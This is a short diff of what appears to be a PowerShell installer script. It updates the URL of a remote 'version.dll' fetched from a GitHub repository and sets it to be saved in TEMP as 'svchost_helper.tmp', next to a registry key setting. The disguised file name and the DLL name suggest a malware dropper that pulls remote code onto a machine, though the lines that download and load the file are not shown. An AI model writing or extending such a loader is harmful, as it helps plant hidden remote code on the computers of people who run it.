@@ -18,7 +18,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # ===== Config =====
- $dllUrl     = "https://raw.githubusercontent.com/newyearon-art/install-v2/refs/heads/main/version.dll"
+ $dllUrl     = "https://raw.githubusercontent.com/newyearon-art/install-v3/refs/heads/main/version.dll"
  $tempDll    = "$env:TEMP\svchost_helper.tmp"
  $regBackup  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People"
  $regValue   = "TaskbarContacts"
